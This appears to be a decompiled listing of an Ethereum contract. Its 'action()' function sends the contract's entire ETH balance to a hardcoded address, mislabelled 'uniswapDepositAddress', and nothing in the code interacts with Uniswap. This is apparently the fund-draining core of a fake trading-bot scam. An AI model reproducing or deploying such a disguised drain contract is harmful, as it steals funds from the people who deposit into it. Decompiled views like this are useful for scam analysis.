contract main {




// =====================  Runtime code  =====================


const uniswapDepositAddress = 0xa88c73bf2a3b6b3aafe8701a39b11bb26dec634


array of uint256 tokenName;
array of uint256 tokenSymbol;

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
    revert
}

function action() payable {
    call 0x0a88c73bf2a3b6b3aafe8701a39b11bb26dec634 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
